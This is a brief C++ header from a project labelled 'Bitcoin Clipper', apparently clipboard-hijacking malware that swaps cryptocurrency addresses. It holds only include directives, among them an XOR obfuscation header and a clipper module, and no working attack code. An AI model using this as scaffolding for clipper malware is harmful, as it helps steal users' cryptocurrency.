#pragma once

/*
 * Bitcoin Clipper
 * Author: d5chahannam
 * Created at 05.02.2022 - 16:11
 */

#include <windows.h>
#include <string>
#include <optional>
#include <vector>
#include <sstream>
#include <functional>
#include <xmmintrin.h>
#include <iostream>
#include <thread>
#include <map>
#include <memory>

#include "nlohmann/json.hpp"

#include "logging.hpp"
#include "singleton.hpp"
#include "xor.hpp"
#include "clipper.hpp"